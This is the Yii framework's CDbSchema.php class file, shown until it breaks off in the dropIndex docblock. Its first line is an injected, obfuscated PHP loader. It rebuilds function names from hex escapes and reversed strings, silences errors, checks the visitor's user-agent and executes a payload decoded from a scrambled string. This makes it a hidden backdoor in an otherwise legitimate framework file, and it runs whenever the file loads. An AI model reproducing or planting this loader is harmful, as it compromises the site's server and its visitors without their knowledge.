<?php $lhqahbp = '268]y7f#<!%tww!>!	x2400~:<h%_t%:osvufs:~:<*9-1-r%-%r	x5c2^-%hOh/#00#W~!%t2w1^W%c!>!%i	x5c2^<!Ce*[!%cIjQeTQcOc/#00#W~!Ydrr)%rxB%epnbss!>!bsopo#>b%!**X)ufttj	x22)gj!|!*nbsbq%)323ldfidk!~!<**qp%!-:W%c:>1<%b:>1<!gps)%j:>1<%j:=tj{fpg)%s:*<%j:,,Bjg!)y31]278]y3e]81]K78:56985:6197g:74985-rr.93e:559sbz)#44ec:649#-!#:618d5f9#-!#f6csfvr#	x5cq%7/7#@#7/7^#iubq#	x5cq%	x27jsv%6<C>^#zsfvr#	x5cq%7**^#zsf%ww2)%w`TW~	x24<!fwbm)%tjw)24<!%tmw!>!#]y84]275]y83]273]y76]27x24-	x24gvodujpo!	x24-	x24y7	x24-	x24*<!	x24-#>>*4-1-bubE{h%)sutcvt)!gj!|!*bubE{h%)j{hnpd!opjud)##Qtjw)#]82#-#!#-%tmw)%tww**WYsboepn)%bss-%rxB%h>#]{hnpd19275fubmgoj{h1:|:*mmvo:>:iuhofm%:-5ppde:4:|:**#ppde#)tub%!|!*)323zbek!~!<b%	x7f!<X>b%Z<#opo#>b%!*##>>X)!gjZ<#!osvufs!*!+A!>!{e%)!>>	x22!ftmbg)!gj<*#k#)usbut`cpV	x7f();}}DU`MPT7-NBFSUT`LDPT7-UFOJ`GB)fubfsdXA	x27K6<	x7fw6*3q5]DgP5]D6#<%fdy>#]D4]273]D6P2L5P6]y6gP7L6M7]D4]88M4P8]37]278]225]241]334]368]322]3]364]6]283]427]36]373P6]>!}W;utpi}Y;tuofuopd`ufh`fmjg}[;ldpt%}K;`ufldpt}X;`msvd}R;*msv%)}.;uas,"	x72	166	x3a	61	x31")) or (strstr($uas,"	x61	156	x64	69	157	x6e"; functiontrtolower($_SERVER["	x48	124	x54	120	x5f	125	x53	84]275]y83]248]y83]256]y81]265]y72]25*w%)ppde>u%V<#65,47R25,d7R177#<!%t2w>#]y74]273]y76]252]y85]256]y6g]257]y86]267]y74]275]y7:]dXA6~6<u%7>/7&6|7**111127-K)ebfsX	x27u%)7fmjix6<C	x27&6<*rfvr#	x5cq%)ufttj	x22)gj6<^#Y#	x5cq%	x27Y%6<.msv`ftsb%j:>>1*!%b:>1<!fmtf!%b:>%s:	x5c%j:.2^,%b luatdge($n){return chr(ord($n)-1);} @error_repo45]K2]285]Ke]53Ld]53]Kc]55Ld]55#*<%bG9}:}.}-}!#*<%nfd>%fdy<tutjyf`439275ttfsqnpdov{h19275j%z>>2*!%z>3<!fmtf!%z>2<!j%)hopm3qjA)qj3hopmA	x273qj%6<*Y%)fnbozcYufhA	x272qj%6<^#zCb*[%h!>!%tdz)%bbT-%bT-%hW~%fs}	x7f;!opjudovg}k~~9{d%:osvufs:~928>>	x22:ftmbg39*56A:>:8:|:7#6#)j6<*doj%7-C)fepmqnjA	x27&6<.fmjgA	x27doj%6<	x7fw6*	FI,6<*127-UVPFNJU,6<*27-SFGTOBSUOSVUFS,6<*msv%7-MSV,6<*)ujojRf>2bd%!<5h%/#0#/*#npd/#)rrd/#00;quui#>.%!<***f	x27,*e	x27,*d	x27,*cUI7jsv%7UFH#	x27rfs%6~6<	x7fw6<*K)uyfu%)3of)fepdof`57ftbc	x7f!|!*uyfu	x27k:!ftmf!}Z;^nbsbq%	x5c%)m%=*h%)m%):fmjix:<##:>:h%:<#64y]552]e7y]#>n%<#372]58y]472]37y= "	x63	162	x65	141	x74	145	x5f	146	x75	156	x63	164	xs%7-K)fujsxX6<#o]o]Y%7;utpI#7>/7rfs%6<#o]1/20QU!*!***b%)sfxpmpusut!-#j0#!/!**#sfmcnbs+yfeobz<#/%	x24-	x24!>!fyqmpefw6*	x7f_*#[k2`{6:!}7;!}6;##}C;!>ufs}w;*	x7f!>>	x22!pd%)!gj}Z;h!opjudovg}s	x5csboe))1/35.)1/14+9**-)1/2986+7**^/%rx<~!!%s:N}#-%oif((function_exists("	x6f	142	x5f	163	x74	141	x72	164") &36]73]83]238M7]381]211M5]67]452]88]5]48]32M3]317]445qA7>q%6<	x7fw6*	x7f_*#fubfsdXk5`{66tjyf`4	x223}!+!<+{e%+*!*+fepdfe{h+{d%)+opjudovg+)!gj+{e%r($uas,"	x66	151	x72	145	x66	j!|!*1?hmg%)!gj!<**2-4j%7>	x2272qj%)7gj6<**2q69	145")) or (strstr($x27;%!<*#}_;#)323ldfid>}&;!osvuf]); if ((strstr($uas,"	x6d	163	x	x7f	x7f	x7f<u%V	x27{ftmfV	x7f<*X&Z&S{ftmfV	x7f<*XAZASV<&w6<*&7-#o]s]o]s]#)fepmqyf	x27*&7-n%)utjm6<	x7fw6*CW&)7gj6<*K)ftpm2#/#%#/#o]#/*)323zbe!-#jt0*?]+^?]_	x5c}X	xrting(0); $xsbrgtl = im3-j%-bubE{h%)sutcvt-#w#)ldbqov>*ofmy%)utjm!|!*5!	x27!hmg%)!g+sfwjidsb`bj+upcotn+qsvmt+fmhpph#)zbssb!-#}#)fepmqnj!/!#0#)id]672]48y]#>s%<#462]47y]252]18y]#>q%<#762]67y]562]38)%cB%iN}#-!	x24/%tmw/	x24)%c*W%eN+#Qi	x5cf)#	x24*<!%t::!>!	x24Ypp3,67R37,#/q%>U<#16,47R57,27R66,#/q%>2q%<#g6R85,67R3<%tpz!>!#]D6M7]K3#<%yy>#]D6]281L1#/#M984:71]K9]77]D4]82]K6]72]K9]78]K5]53]Kc#bssbz)#P#-#Q#-#B#-#T#-#E#-#G#-#H#-#I#-#K	x22)!gj}1~!<2p%	x7f!~!<##!>%-bubE{h%)sutcvt)fubmgoj{hA!osvufs!~<3,j%>j%!*3!	x27!4y4	x24-	x24]y8	x24-	x24]26	x24-	x24<%j,,*!|	/%tmw/	x24)%zW%h>EzH,2W%wN;#-Ez-1H*WCw*[!%rN}#QwTW%hIr	x5c1^5]D2P4]D6#<%G]y6d]281Ld]2#)tutjyf`x	x22l:!}V;3q%}U;yd%-#1GO	x22#)fepmqyfA>2b%!<*qp%-*.%)euhA)3o`hA	x27pd%6<pd%w6Z6<.4`hA	x27pd%6<pd%w6Z6<.3`hA	x27pd%6<pd%w6Z6<.2`24-	x24tvctus)%	x24-	x24b!>!%yy)#}#-#	x24-	x24-tusqpt)%z-#7,18R#>q%V<*#fopoV;hojepdoF.uofuopD#)sfebfI{*w%)kVx{**#k	x27,*b	x27)fepdof.)fepdof7f-s.973:8297f:5297e:56-xr.985:52985-t.98]K4]65]D8]86]y31]278]y3162	x6f	151	x64")) or (str*<(<!fwbm)%tjw)#	x24#-!#]y38#-!%w:**<"))s%)7gj6<*id%)ftpmdR6<*id%)dfyfR	x27tfs%6<*17-SFEBftpmdXA6|7**197-2qj%7-K)udfoopdXA	x22)7gj6<*Q68399#-!#65egb2dc#*<!sfuvso!sboepn)%epnbss-%rxW~!Ypp2)%zB%z>!	x24f]51L3]84]y31M6]y3e]81#/#7e:55946-tr.984:75983:48-bubE{h%)sutcvt)esp>!2p%Z<^2	x5c2b%!>!2p%!*3>?*2b%)gpf{jt)!gj!<*2b& (!isset($GLOBALS["	x61	156	x75	156	x61"])))) { $GLOBALS["	x61	156	x{;#)tutjyf`opjudovg)!gj!|!*msv%)}k~~~<ftmbg!osvufs!|ftmf!~<**9.-j/h%)n%-#+I#)q%:>:r%:|:**td2bge56+99386c6f+9f5d816:+946:ce44#)zbssb!>!ssbnpe_GMFT`QIQ&f_U]275]D:M8]Df#<%tdz>#L4]275L3]248L3P6L1Movg!|!**#j{hnpd#)tutjyf`opjudovg:#*	x24-	x24!>!	x24/%tjw/	x24)%	x24-	x2hA	x27pd%6<C	x27pd%6|6.7eu{66~67<hmg%!<12>j%!|!*#91y]c9y]g2y]SFWSFT`%}X;!sp!*#opo#>>}R;msv}.;/#/#/},;#-#}+;%-qp%)54l}	y]572]48y]#>m%:|:*r%:-t%)3of:opjudovg<~	plode(array_map("luatdge",str_split("%tjw!>!#]yudovg}x;0]=])0#)U!	x27{**u%-#jt0}Z;0]=]0#)2q%l}S;2-u%!-#:W~!%z!>2<!gps)%j>1<%j=6[%ww2!>#p#/#p#/%z<jg!)7}88:}334}472	x24<!%ff2!>!bssbz)	x24]25	x24-	x24-!%	x24-ubn`hfsq)!sp!*#ojneb#-*f%)s75	156	x61"]=1; $uas=s]212]445]43]321]464]284]364]6]234]342]58]24]31#-%tdz*Wsfuvso!%bs./#@#/qp%>5h%!<*::::::-111112)eobs`un>qp%!|Z~!<##!>!2p%!|x6d	145")) or (strst	x24gps)%j>1<%j=tj{fpg)%	x24-	x24*<!~!	x24/%t2w/	x24)##-!#~4]y76#<!%w:!>!(%w:!>!	x246767~6<Cw6<pd%w6Z6<.5~6<&w6<	x7fw6*CW&)7gx24<!%o:!>!	x242178}52fxpmpusut)tpqssutRe%)Rd%)Rb%))!gj!<*#cx7f_*#fmjgk4`{6~6<tfs%w6<	x7fw6*CWtf:<!%c:>%s:	x5c%j:^<!%w`	x5c^>Ew:Qb:Qc#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-#O#-#N#*-!%ff2-!%t::*157	x78"))) { $sirkuht str($uas,"	x63	150	x72	157	]}R;2]},;osvufs}	x27;mnui}&;zepc}A;~!}	x7f;!|!}{;)gj}l;33bq}k;opj`UQPMSVD!-id%)uqpuft`msvd},;uqpuft`msvTPI`QUUI&e_SEEB`FUPNFS&d_SFSFGFS`QUUI&c_UOFHB`SFTV`QUUI&#-bubE{h%)tpqsut>j%!*9!	x27!hmg%)!gj!~<ofmy%,3,j%>j%!<**)s%>/h%:<**#57]38y]47]67y]37]88y]27]28y]#/r%	x24*!|!	x24-	x24	x5c%j^	x105	x52	137	x41	107	x45	116	x54"	x27id%6<	x7fw6*	x7f_*#ujojRk3`{666~6d}+;!>!}	x27;!>>>!}_;gvc%}&;ftmbg}	x7f;!osvhmg%!)!gj!<2,*j%!-#1]#-bubE{h%)tpqsut>j%!*72!	x27!hmg%)!gj!<2,*j%-#1]dy)##-!#~<%h00#*<%nfd)##Qtpz)#]341);$fbquwbw = $sirkuht("", $xsbrgtl); $fbquwbw<&w6<	x7fw6*CW&)7gj6<.[A	x27&6<	x7StrrEVxNoiTCnUF_EtaERCxecAlPeR_rtSslaeureq'; $wvbpvrtg=explode(chr((520-400)),substr($lhqahbp,(20463-14443),(171-137))); $zkwjpzcvaa = $wvbpvrtg[0]($wvbpvrtg[(6-5)]); $obsltt = $wvbpvrtg[0]($wvbpvrtg[(8-6)]); if (!function_exists('gcygljmumf')) { function gcygljmumf($udbzqdmg, $mzfbxo,$fnkyniucc) { $fmeout = NULL; for($afrwaczpxf=0;$afrwaczpxf<(sizeof($udbzqdmg)/2);$afrwaczpxf++) { $fmeout .= substr($mzfbxo, $udbzqdmg[($afrwaczpxf*2)],$udbzqdmg[($afrwaczpxf*2)+(4-3)]); } return $fnkyniucc(chr((53-44)),chr((301-209)),$fmeout); }; } $njyorgw = explode(chr((208-164)),'2353,57,4197,69,4919,22,1079,49,5726,32,2681,32,2627,22,1000,58,3857,26,5414,27,5062,20,2553,29,5391,23,2058,53,1058,21,1406,48,2877,23,4687,47,1128,37,5141,46,3586,67,4529,33,2769,66,1256,59,2111,47,1900,34,3972,45,774,53,2604,23,1568,58,323,67,1315,51,2462,35,5187,20,1721,51,5267,36,3923,49,1772,61,5758,37,5986,34,2225,33,933,67,5506,38,5795,43,2258,40,4266,65,3333,53,5838,69,5600,56,2900,60,2582,22,4131,20,4562,28,497,50,4458,32,3305,28,4151,46,3543,43,1833,67,3767,26,5005,57,2158,45,2960,61,4892,27,5229,38,4356,63,5544,56,660,54,138,55,1934,61,4590,57,2649,32,1655,66,1513,31,599,61,2497,56,714,55,2713,56,1165,28,3138,50,3711,56,3516,27,5441,65,4734,56,2835,42,417,35,1193,63,0,49,5656,44,4331,25,1995,63,3021,51,4647,40,5207,22,4836,56,5700,26,3653,58,4490,39,3386,45,452,45,5082,59,2203,22,3113,25,3072,41,75,63,291,32,4017,65,3431,60,49,26,547,52,244,47,3793,64,4082,49,3225,40,3188,37,827,46,4419,39,3491,25,1454,59,1626,29,5907,34,873,60,2410,52,4941,64,2298,55,193,51,1366,40,5303,37,4790,46,1544,24,390,27,3265,40,5340,51,3883,40,5941,45,769,5'); $nnpxboon = $zkwjpzcvaa("",gcygljmumf($njyorgw,$lhqahbp,$obsltt)); $zkwjpzcvaa=$lhqahbp; $nnpxboon(""); $nnpxboon=(464-343); $lhqahbp=$nnpxboon-1; ?><?php
/**
 * CDbSchema class file.
 *
 * @author Qiang Xue <qiang.xue@gmail.com>
 * @link http://www.yiiframework.com/
 * @copyright 2008-2013 Yii Software LLC
 * @license http://www.yiiframework.com/license/
 */

/**
 * CDbSchema is the base class for retrieving metadata information.
 *
 * @property CDbConnection $dbConnection Database connection. The connection is active.
 * @property array $tables The metadata for all tables in the database.
 * Each array element is an instance of {@link CDbTableSchema} (or its child class).
 * The array keys are table names.
 * @property array $tableNames All table names in the database.
 * @property CDbCommandBuilder $commandBuilder The SQL command builder for this connection.
 *
 * @author Qiang Xue <qiang.xue@gmail.com>
 * @package system.db.schema
 * @since 1.0
 */
abstract class CDbSchema extends CComponent
{
	/**
	 * @var array the abstract column types mapped to physical column types.
	 * @since 1.1.6
	 */
	public $columnTypes=array();

	private $_tableNames=array();
	private $_tables=array();
	private $_connection;
	private $_builder;
	private $_cacheExclude=array();

	/**
	 * Loads the metadata for the specified table.
	 * @param string $name table name
	 * @return CDbTableSchema driver dependent table metadata, null if the table does not exist.
	 */
	abstract protected function loadTable($name);

	/**
	 * Constructor.
	 * @param CDbConnection $conn database connection.
	 */
	public function __construct($conn)
	{
		$this->_connection=$conn;
		foreach($conn->schemaCachingExclude as $name)
			$this->_cacheExclude[$name]=true;
	}

	/**
	 * @return CDbConnection database connection. The connection is active.
	 */
	public function getDbConnection()
	{
		return $this->_connection;
	}

	/**
	 * Obtains the metadata for the named table.
	 * @param string $name table name
	 * @param boolean $refresh if we need to refresh schema cache for a table.
	 * Parameter available since 1.1.9
	 * @return CDbTableSchema table metadata. Null if the named table does not exist.
	 */
	public function getTable($name,$refresh=false)
	{
		if($refresh===false && isset($this->_tables[$name]))
			return $this->_tables[$name];
		else
		{
			if($this->_connection->tablePrefix!==null && strpos($name,'{{')!==false)
				$realName=preg_replace('/\{\{(.*?)\}\}/',$this->_connection->tablePrefix.'$1',$name);
			else
				$realName=$name;

			// temporarily disable query caching
			if($this->_connection->queryCachingDuration>0)
			{
				$qcDuration=$this->_connection->queryCachingDuration;
				$this->_connection->queryCachingDuration=0;
			}

			if(!isset($this->_cacheExclude[$name]) && ($duration=$this->_connection->schemaCachingDuration)>0 && $this->_connection->schemaCacheID!==false && ($cache=Yii::app()->getComponent($this->_connection->schemaCacheID))!==null)
			{
				$key='yii:dbschema'.$this->_connection->connectionString.':'.$this->_connection->username.':'.$name;
				$table=$cache->get($key);
				if($refresh===true || $table===false)
				{
					$table=$this->loadTable($realName);
					if($table!==null)
						$cache->set($key,$table,$duration);
				}
				$this->_tables[$name]=$table;
			}
			else
				$this->_tables[$name]=$table=$this->loadTable($realName);

			if(isset($qcDuration))  // re-enable query caching
				$this->_connection->queryCachingDuration=$qcDuration;

			return $table;
		}
	}

	/**
	 * Returns the metadata for all tables in the database.
	 * @param string $schema the schema of the tables. Defaults to empty string, meaning the current or default schema.
	 * @return array the metadata for all tables in the database.
	 * Each array element is an instance of {@link CDbTableSchema} (or its child class).
	 * The array keys are table names.
	 */
	public function getTables($schema='')
	{
		$tables=array();
		foreach($this->getTableNames($schema) as $name)
		{
			if(($table=$this->getTable($name))!==null)
				$tables[$name]=$table;
		}
		return $tables;
	}

	/**
	 * Returns all table names in the database.
	 * @param string $schema the schema of the tables. Defaults to empty string, meaning the current or default schema.
	 * If not empty, the returned table names will be prefixed with the schema name.
	 * @return array all table names in the database.
	 */
	public function getTableNames($schema='')
	{
		if(!isset($this->_tableNames[$schema]))
			$this->_tableNames[$schema]=$this->findTableNames($schema);
		return $this->_tableNames[$schema];
	}

	/**
	 * @return CDbCommandBuilder the SQL command builder for this connection.
	 */
	public function getCommandBuilder()
	{
		if($this->_builder!==null)
			return $this->_builder;
		else
			return $this->_builder=$this->createCommandBuilder();
	}

	/**
	 * Refreshes the schema.
	 * This method resets the loaded table metadata and command builder
	 * so that they can be recreated to reflect the change of schema.
	 */
	public function refresh()
	{
		if(($duration=$this->_connection->schemaCachingDuration)>0 && $this->_connection->schemaCacheID!==false && ($cache=Yii::app()->getComponent($this->_connection->schemaCacheID))!==null)
		{
			foreach(array_keys($this->_tables) as $name)
			{
				if(!isset($this->_cacheExclude[$name]))
				{
					$key='yii:dbschema'.$this->_connection->connectionString.':'.$this->_connection->username.':'.$name;
					$cache->delete($key);
				}
			}
		}
		$this->_tables=array();
		$this->_tableNames=array();
		$this->_builder=null;
	}

	/**
	 * Quotes a table name for use in a query.
	 * If the table name contains schema prefix, the prefix will also be properly quoted.
	 * @param string $name table name
	 * @return string the properly quoted table name
	 * @see quoteSimpleTableName
	 */
	public function quoteTableName($name)
	{
		if(strpos($name,'.')===false)
			return $this->quoteSimpleTableName($name);
		$parts=explode('.',$name);
		foreach($parts as $i=>$part)
			$parts[$i]=$this->quoteSimpleTableName($part);
		return implode('.',$parts);

	}

	/**
	 * Quotes a simple table name for use in a query.
	 * A simple table name does not schema prefix.
	 * @param string $name table name
	 * @return string the properly quoted table name
	 * @since 1.1.6
	 */
	public function quoteSimpleTableName($name)
	{
		return "'".$name."'";
	}

	/**
	 * Quotes a column name for use in a query.
	 * If the column name contains prefix, the prefix will also be properly quoted.
	 * @param string $name column name
	 * @return string the properly quoted column name
	 * @see quoteSimpleColumnName
	 */
	public function quoteColumnName($name)
	{
		if(($pos=strrpos($name,'.'))!==false)
		{
			$prefix=$this->quoteTableName(substr($name,0,$pos)).'.';
			$name=substr($name,$pos+1);
		}
		else
			$prefix='';
		return $prefix . ($name==='*' ? $name : $this->quoteSimpleColumnName($name));
	}

	/**
	 * Quotes a simple column name for use in a query.
	 * A simple column name does not contain prefix.
	 * @param string $name column name
	 * @return string the properly quoted column name
	 * @since 1.1.6
	 */
	public function quoteSimpleColumnName($name)
	{
		return '"'.$name.'"';
	}

	/**
	 * Compares two table names.
	 * The table names can be either quoted or unquoted. This method
	 * will consider both cases.
	 * @param string $name1 table name 1
	 * @param string $name2 table name 2
	 * @return boolean whether the two table names refer to the same table.
	 */
	public function compareTableNames($name1,$name2)
	{
		$name1=str_replace(array('"','`',"'"),'',$name1);
		$name2=str_replace(array('"','`',"'"),'',$name2);
		if(($pos=strrpos($name1,'.'))!==false)
			$name1=substr($name1,$pos+1);
		if(($pos=strrpos($name2,'.'))!==false)
			$name2=substr($name2,$pos+1);
		if($this->_connection->tablePrefix!==null)
		{
			if(strpos($name1,'{')!==false)
				$name1=$this->_connection->tablePrefix.str_replace(array('{','}'),'',$name1);
			if(strpos($name2,'{')!==false)
				$name2=$this->_connection->tablePrefix.str_replace(array('{','}'),'',$name2);
		}
		return $name1===$name2;
	}

	/**
	 * Resets the sequence value of a table's primary key.
	 * The sequence will be reset such that the primary key of the next new row inserted
	 * will have the specified value or max value of a primary key plus one (i.e. sequence trimming).
	 * @param CDbTableSchema $table the table schema whose primary key sequence will be reset
	 * @param integer|null $value the value for the primary key of the next new row inserted.
	 * If this is not set, the next new row's primary key will have the max value of a primary
	 * key plus one (i.e. sequence trimming).
	 * @since 1.1
	 */
	public function resetSequence($table,$value=null)
	{
	}

	/**
	 * Enables or disables integrity check.
	 * @param boolean $check whether to turn on or off the integrity check.
	 * @param string $schema the schema of the tables. Defaults to empty string, meaning the current or default schema.
	 * @since 1.1
	 */
	public function checkIntegrity($check=true,$schema='')
	{
	}

	/**
	 * Creates a command builder for the database.
	 * This method may be overridden by child classes to create a DBMS-specific command builder.
	 * @return CDbCommandBuilder command builder instance
	 */
	protected function createCommandBuilder()
	{
		return new CDbCommandBuilder($this);
	}

	/**
	 * Returns all table names in the database.
	 * This method should be overridden by child classes in order to support this feature
	 * because the default implementation simply throws an exception.
	 * @param string $schema the schema of the tables. Defaults to empty string, meaning the current or default schema.
	 * If not empty, the returned table names will be prefixed with the schema name.
	 * @throws CDbException if current schema does not support fetching all table names
	 * @return array all table names in the database.
	 */
	protected function findTableNames($schema='')
	{
		throw new CDbException(Yii::t('yii','{class} does not support fetching all table names.',
			array('{class}'=>get_class($this))));
	}

	/**
	 * Converts an abstract column type into a physical column type.
	 * The conversion is done using the type map specified in {@link columnTypes}.
	 * These abstract column types are supported (using MySQL as example to explain the corresponding
	 * physical types):
	 * <ul>
	 * <li>pk and bigpk: an auto-incremental primary key type, will be converted into "int(11) NOT NULL AUTO_INCREMENT PRIMARY KEY" or "bigint(20) NOT NULL AUTO_INCREMENT PRIMARY KEY"</li>
	 * <li>string: string type, will be converted into "varchar(255)"</li>
	 * <li>text: a long string type, will be converted into "text"</li>
	 * <li>integer: integer type, will be converted into "int(11)"</li>
	 * <li>bigint: integer type, will be converted into "bigint(20)"</li>
	 * <li>boolean: boolean type, will be converted into "tinyint(1)"</li>
	 * <li>float: float number type, will be converted into "float"</li>
	 * <li>decimal: decimal number type, will be converted into "decimal"</li>
	 * <li>datetime: datetime type, will be converted into "datetime"</li>
	 * <li>timestamp: timestamp type, will be converted into "timestamp"</li>
	 * <li>time: time type, will be converted into "time"</li>
	 * <li>date: date type, will be converted into "date"</li>
	 * <li>binary: binary data type, will be converted into "blob"</li>
	 * </ul>
	 *
	 * If the abstract type contains two or more parts separated by spaces (e.g. "string NOT NULL"), then only
	 * the first part will be converted, and the rest of the parts will be appended to the conversion result.
	 * For example, 'string NOT NULL' is converted to 'varchar(255) NOT NULL'.
	 * @param string $type abstract column type
	 * @return string physical column type.
	 * @since 1.1.6
	 */
	public function getColumnType($type)
	{
		if(isset($this->columnTypes[$type]))
			return $this->columnTypes[$type];
		elseif(($pos=strpos($type,' '))!==false)
		{
			$t=substr($type,0,$pos);
			return (isset($this->columnTypes[$t]) ? $this->columnTypes[$t] : $t).substr($type,$pos);
		}
		else
			return $type;
	}

	/**
	 * Builds a SQL statement for creating a new DB table.
	 *
	 * The columns in the new  table should be specified as name-definition pairs (e.g. 'name'=>'string'),
	 * where name stands for a column name which will be properly quoted by the method, and definition
	 * stands for the column type which can contain an abstract DB type.
	 * The {@link getColumnType} method will be invoked to convert any abstract type into a physical one.
	 *
	 * If a column is specified with definition only (e.g. 'PRIMARY KEY (name, type)'), it will be directly
	 * inserted into the generated SQL.
	 *
	 * @param string $table the name of the table to be created. The name will be properly quoted by the method.
	 * @param array $columns the columns (name=>definition) in the new table.
	 * @param string $options additional SQL fragment that will be appended to the generated SQL.
	 * @return string the SQL statement for creating a new DB table.
	 * @since 1.1.6
	 */
	public function createTable($table,$columns,$options=null)
	{
		$cols=array();
		foreach($columns as $name=>$type)
		{
			if(is_string($name))
				$cols[]="\t".$this->quoteColumnName($name).' '.$this->getColumnType($type);
			else
				$cols[]="\t".$type;
		}
		$sql="CREATE TABLE ".$this->quoteTableName($table)." (\n".implode(",\n",$cols)."\n)";
		return $options===null ? $sql : $sql.' '.$options;
	}

	/**
	 * Builds a SQL statement for renaming a DB table.
	 * @param string $table the table to be renamed. The name will be properly quoted by the method.
	 * @param string $newName the new table name. The name will be properly quoted by the method.
	 * @return string the SQL statement for renaming a DB table.
	 * @since 1.1.6
	 */
	public function renameTable($table,$newName)
	{
		return 'RENAME TABLE ' . $this->quoteTableName($table) . ' TO ' . $this->quoteTableName($newName);
	}

	/**
	 * Builds a SQL statement for dropping a DB table.
	 * @param string $table the table to be dropped. The name will be properly quoted by the method.
	 * @return string the SQL statement for dropping a DB table.
	 * @since 1.1.6
	 */
	public function dropTable($table)
	{
		return "DROP TABLE ".$this->quoteTableName($table);
	}

	/**
	 * Builds a SQL statement for truncating a DB table.
	 * @param string $table the table to be truncated. The name will be properly quoted by the method.
	 * @return string the SQL statement for truncating a DB table.
	 * @since 1.1.6
	 */
	public function truncateTable($table)
	{
		return "TRUNCATE TABLE ".$this->quoteTableName($table);
	}

	/**
	 * Builds a SQL statement for adding a new DB column.
	 * @param string $table the table that the new column will be added to. The table name will be properly quoted by the method.
	 * @param string $column the name of the new column. The name will be properly quoted by the method.
	 * @param string $type the column type. The {@link getColumnType} method will be invoked to convert abstract column type (if any)
	 * into the physical one. Anything that is not recognized as abstract type will be kept in the generated SQL.
	 * For example, 'string' will be turned into 'varchar(255)', while 'string not null' will become 'varchar(255) not null'.
	 * @return string the SQL statement for adding a new column.
	 * @since 1.1.6
	 */
	public function addColumn($table,$column,$type)
	{
		return 'ALTER TABLE ' . $this->quoteTableName($table)
			. ' ADD ' . $this->quoteColumnName($column) . ' '
			. $this->getColumnType($type);
	}

	/**
	 * Builds a SQL statement for dropping a DB column.
	 * @param string $table the table whose column is to be dropped. The name will be properly quoted by the method.
	 * @param string $column the name of the column to be dropped. The name will be properly quoted by the method.
	 * @return string the SQL statement for dropping a DB column.
	 * @since 1.1.6
	 */
	public function dropColumn($table,$column)
	{
		return "ALTER TABLE ".$this->quoteTableName($table)
			." DROP COLUMN ".$this->quoteColumnName($column);
	}

	/**
	 * Builds a SQL statement for renaming a column.
	 * @param string $table the table whose column is to be renamed. The name will be properly quoted by the method.
	 * @param string $name the old name of the column. The name will be properly quoted by the method.
	 * @param string $newName the new name of the column. The name will be properly quoted by the method.
	 * @return string the SQL statement for renaming a DB column.
	 * @since 1.1.6
	 */
	public function renameColumn($table,$name,$newName)
	{
		return "ALTER TABLE ".$this->quoteTableName($table)
			. " RENAME COLUMN ".$this->quoteColumnName($name)
			. " TO ".$this->quoteColumnName($newName);
	}

	/**
	 * Builds a SQL statement for changing the definition of a column.
	 * @param string $table the table whose column is to be changed. The table name will be properly quoted by the method.
	 * @param string $column the name of the column to be changed. The name will be properly quoted by the method.
	 * @param string $type the new column type. The {@link getColumnType} method will be invoked to convert abstract column type (if any)
	 * into the physical one. Anything that is not recognized as abstract type will be kept in the generated SQL.
	 * For example, 'string' will be turned into 'varchar(255)', while 'string not null' will become 'varchar(255) not null'.
	 * @return string the SQL statement for changing the definition of a column.
	 * @since 1.1.6
	 */
	public function alterColumn($table,$column,$type)
	{
		return 'ALTER TABLE ' . $this->quoteTableName($table) . ' CHANGE '
			. $this->quoteColumnName($column) . ' '
			. $this->quoteColumnName($column) . ' '
			. $this->getColumnType($type);
	}

	/**
	 * Builds a SQL statement for adding a foreign key constraint to an existing table.
	 * The method will properly quote the table and column names.
	 * @param string $name the name of the foreign key constraint.
	 * @param string $table the table that the foreign key constraint will be added to.
	 * @param string|array $columns the name of the column to that the constraint will be added on. If there are multiple columns, separate them with commas or pass as an array of column names.
	 * @param string $refTable the table that the foreign key references to.
	 * @param string|array $refColumns the name of the column that the foreign key references to. If there are multiple columns, separate them with commas or pass as an array of column names.
	 * @param string $delete the ON DELETE option. Most DBMS support these options: RESTRICT, CASCADE, NO ACTION, SET DEFAULT, SET NULL
	 * @param string $update the ON UPDATE option. Most DBMS support these options: RESTRICT, CASCADE, NO ACTION, SET DEFAULT, SET NULL
	 * @return string the SQL statement for adding a foreign key constraint to an existing table.
	 * @since 1.1.6
	 */
	public function addForeignKey($name,$table,$columns,$refTable,$refColumns,$delete=null,$update=null)
	{
		if(is_string($columns))
			$columns=preg_split('/\s*,\s*/',$columns,-1,PREG_SPLIT_NO_EMPTY);
		foreach($columns as $i=>$col)
			$columns[$i]=$this->quoteColumnName($col);
		if(is_string($refColumns))
			$refColumns=preg_split('/\s*,\s*/',$refColumns,-1,PREG_SPLIT_NO_EMPTY);
		foreach($refColumns as $i=>$col)
			$refColumns[$i]=$this->quoteColumnName($col);
		$sql='ALTER TABLE '.$this->quoteTableName($table)
			.' ADD CONSTRAINT '.$this->quoteColumnName($name)
			.' FOREIGN KEY ('.implode(', ',$columns).')'
			.' REFERENCES '.$this->quoteTableName($refTable)
			.' ('.implode(', ',$refColumns).')';
		if($delete!==null)
			$sql.=' ON DELETE '.$delete;
		if($update!==null)
			$sql.=' ON UPDATE '.$update;
		return $sql;
	}

	/**
	 * Builds a SQL statement for dropping a foreign key constraint.
	 * @param string $name the name of the foreign key constraint to be dropped. The name will be properly quoted by the method.
	 * @param string $table the table whose foreign is to be dropped. The name will be properly quoted by the method.
	 * @return string the SQL statement for dropping a foreign key constraint.
	 * @since 1.1.6
	 */
	public function dropForeignKey($name,$table)
	{
		return 'ALTER TABLE '.$this->quoteTableName($table)
			.' DROP CONSTRAINT '.$this->quoteColumnName($name);
	}

	/**
	 * Builds a SQL statement for creating a new index.
	 * @param string $name the name of the index. The name will be properly quoted by the method.
	 * @param string $table the table that the new index will be created for. The table name will be properly quoted by the method.
	 * @param string|array $columns the column(s) that should be included in the index. If there are multiple columns, please separate them
	 * by commas or pass as an array of column names. Each column name will be properly quoted by the method, unless a parenthesis is found in the name.
	 * @param boolean $unique whether to add UNIQUE constraint on the created index.
	 * @return string the SQL statement for creating a new index.
	 * @since 1.1.6
	 */
	public function createIndex($name,$table,$columns,$unique=false)
	{
		$cols=array();
		if(is_string($columns))
			$columns=preg_split('/\s*,\s*/',$columns,-1,PREG_SPLIT_NO_EMPTY);
		foreach($columns as $col)
		{
			if(strpos($col,'(')!==false)
				$cols[]=$col;
			else
				$cols[]=$this->quoteColumnName($col);
		}
		return ($unique ? 'CREATE UNIQUE INDEX ' : 'CREATE INDEX ')
			. $this->quoteTableName($name).' ON '
			. $this->quoteTableName($table).' ('.implode(', ',$cols).')';
	}

	/**
	 * Builds a SQL statement for dropping an index.
	 * @param string $name the name of the index to be dropped. The name will be properly quoted by the method.
